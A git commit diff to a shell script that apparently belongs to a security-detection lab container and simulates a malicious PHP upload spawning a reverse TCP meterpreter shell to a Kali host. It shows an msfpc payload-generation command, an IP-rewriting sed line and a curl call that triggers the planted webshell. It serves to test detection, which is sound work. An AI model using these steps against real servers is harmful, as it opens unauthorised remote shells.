2452a2b3fd4660cc36e401f23eb08ca57af54d5b
Marcel <mclaassen@duketown.com>
2021-01-14 13:18:29 +0000

    Updates in scripts and menu

--- bin/metasploit/Webserver_Trigger_Metasploit_Payload.sh
+++ bin/metasploit/Webserver_Trigger_Metasploit_Payload.sh
@@ -1,12 +1,12 @@
 #/bin/sh
 
 echo -e "\e[92mSimulate a malicious file upload, which executes a reverse TCP meterpreter to Kali on port 4444\n"
-echo -e "This scenario is multi-step, please follow these actions:"
+echo -e "This scenario is multi-step, please follow these actions before confirming the Kali IP address:\n"
 
-echo -e "1) Make sure you started this container using exposed ports (using below command) and a Kali host is available:"
+echo -e "1) Ensure you started this container using exposed ports (using below command) and a Kali host is available:"
 echo -e "\033[33m\t$> docker run --rm -it -p 8080:80 mclaassen/cs_centos"
 
-echo -e "\e[92m2) Generate the PHP Listener on a kali machine (replace IP address with your kali IP):"
+echo -e "\e[92m2) Generate the PHP Listener on a Kali machine (replace the IP address with your Kali IP):"
 echo -e "\033[33m\t$> msfpc php reverse stageless tcp 172.17.0.21 4444"
 
 echo -e "\e[92m3) Start listener: "
@@ -25,5 +25,6 @@ sed s/172\.17\.0\.21/$ip_addr/g /var/www/html/uploads/php-meterpreter-stageless-
 
 curl -s http://localhost/uploads/webshell.php & >/dev/null
 
-echo -e "Execute commands from the meterpreter shell. Please note that this shell will remain active in the background."
+echo -e "Execute commands from the meterpreter shell on your Kali host to generate a detection (session -i and shell). For more information see the Linux webshell detection on Wiki"
+echo -e "Please note that this shell will remain active in the background until the container is terminated."
 sleep 5
